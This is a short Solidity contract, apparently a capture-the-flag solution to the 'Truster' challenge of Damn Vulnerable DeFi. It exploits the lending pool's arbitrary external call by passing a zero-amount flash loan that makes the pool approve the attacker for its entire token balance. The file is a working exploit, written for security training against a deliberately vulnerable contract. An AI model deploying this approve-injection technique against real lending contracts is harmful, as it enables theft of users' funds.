import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract TrusterHacker {
    constructor(TrusterLenderPool _tlp) public {
        address owner = msg.sender;

        bytes memory approveCalldata = abi.encodeWithSelector(
            IERC20.approve.selector,
            owner,
            type(uint256).max
        );

        address token = address(_tlp.damnValuableToken());

        _tlp.flashLoan(
            0,
            address(_tlp),
            token,
            approveCalldata
        );
    }
}